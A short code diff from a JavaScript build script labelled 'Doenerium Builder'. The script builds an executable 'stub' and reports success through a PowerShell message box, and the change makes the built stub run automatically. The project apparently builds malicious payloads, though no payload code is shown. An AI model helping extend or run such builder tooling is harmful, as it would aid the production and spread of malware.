@@ -69,7 +69,7 @@ async function main() {
             notifySuccess(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
             await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}', 'Doenerium Builder', 'OK', 'Information')"`);
             await exec(`start explorer "${path.join(CURRENT_DIR, 'build')}"`);
-	    //await exec(`"${path.join(CURRENT_DIR, 'build', outputFilename)}"`);
+	    await exec(`"${path.join(CURRENT_DIR, 'build', outputFilename)}"`);
         }
 
     } catch (error) {
